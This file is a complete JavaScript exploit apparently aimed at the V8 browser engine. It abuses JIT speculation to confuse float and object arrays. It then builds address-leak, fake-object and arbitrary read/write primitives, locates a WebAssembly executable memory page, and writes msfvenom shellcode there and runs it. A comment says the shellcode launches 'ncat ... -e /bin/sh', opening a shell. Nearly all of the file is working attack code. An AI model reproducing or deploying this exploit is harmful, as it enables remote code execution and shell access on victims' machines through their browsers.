// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

/**
  * Float to Integer
  * in: Float (ex: 2.2)
  * out: Unsigned Int
*/
function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n); // Watch for little endianness
}

/**
  * Integer to Float
  * in: Unsigned Int
  * out: Float (ex: 2.2)
*/
function itof(val) { // typeof(val) = BigInt
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

/**
  * To hex
  * in: Float (ex: 2.2)
  * out: 0xbaddbeef
*/
function ftoh(val) {
  return "0x" + ftoi(val).toString(16)
}

function hex(val) {
  return "0x" + val.toString(16)
}

function read_bug(array, index) {
  // add junk code to JIT not _inline_ this function
  for (var i = 0; i < 1; i++) {
    i += 2;
  }
  return array[index];
}

function write_bug(array, index, val) {
  // add junk code to JIT not _inline_ this function
  for (var i = 0; i < 1; i++) {
    i += 2;
  }
  array[index] = val;
}

function trigger_bug() {
  var a = [1.1, 1.2]; // float array
  for (var i = 0; i < 100_000; i++) {
    read_bug(a, 0); // Training speculator to float array's
    write_bug(a, 0, 1.2); // Training speculator to float array's
  }
}

function addrOf(obj) {
  obj_arr = [obj, obj];
  write_bug(obj_arr, 1, itof((fixed_arr_prop << 32n) + float_map));
  addr = (ftoi(obj_arr[0]) & 0xffffffffn);
  obj_arr = [temp, temp];
  return addr;
}

function fakeObj(addr) {
  obj_arr = [temp, temp];
  write_bug(obj_arr, 0, itof(BigInt(addr)));
  fake = obj_arr[0];
  obj_arr = [temp, temp];
  return fake;
}

function read(addr) {
  // pointer tagging
  if (addr % 2n == 0) {
    addr += 1;
  }

  fake_arr[1] = itof((8n << 32n) + addr - 8n);
  return fake[0];
}

function write(addr, val) {
  // pointer tagging
  if (addr % 2n == 0) {
    addr += 1;
  }
  fake_arr[1] = itof((8n << 32n) + addr - 8n);
  fake[0] = itof(BigInt(val));
}

function copy_shellcode(addr, shellcode) {
  let buf = new ArrayBuffer(0x100);
  let dataview = new DataView(buf);
  let buf_addr = addrOf(buf);
  let backing_store_addr = buf_addr + 0x14n;
  write(backing_store_addr, addr);
  for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint32(4 * i, shellcode[i], true);
  }
}

trigger_bug();
var temp = { "prop": 1 };
var obj_map_leak = [temp, temp];
var obj_map = ftoi(read_bug(obj_map_leak, 1)) & 0xffffffffn;
var fixed_arr_prop = ftoi(read_bug(obj_map_leak, 1)) >> 32n;
var float_map = obj_map - 0x50n;

console.log("[+] Float  Map: 0x" + float_map.toString(16));
console.log("[+] Object Map: 0x" + obj_map.toString(16));

var float_arr = [1.1, 1.2];
var obj_arr = [temp, temp];

var fake_arr = [itof(float_map), 1.2, 1.3, 1.4];
var fake = fakeObj(addrOf(fake_arr) - 0x20n);

var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_exec_shellcode = wasm_instance.exports.main;

console.log("[+] Found pointer to wasm instance: 0x" + addrOf(wasm_instance).toString(16));
var rwx_page_addr = ftoi(read(addrOf(wasm_instance) + 0x68n));
console.log("[+] Found pointer to rwx page: 0x" + addrOf(rwx_page_addr).toString(16));

// msfvenom -p linux/x64/exec CMD='ncat 0.0.0.0 9001 -e /bin/sh' --format dword
var shellcode = [
  0x622fb848, 0x732f6e69, 0x50990068, 0x66525f54, 0x54632d68, 0x1de8525e, 0x6e000000, 0x20746163,
  0x2e302e30, 0x20302e30, 0x31303039, 0x20652d20, 0x6e69622f, 0x0068732f, 0x5e545756, 0x0f583b6a,
  0x00000005
];
copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] WASM instance - OK");
console.log("[+] Shellcode - OK");
console.log("[+] Read/write/exec - OK");

console.log("[*] Running shellcode...");
wasm_exec_shellcode();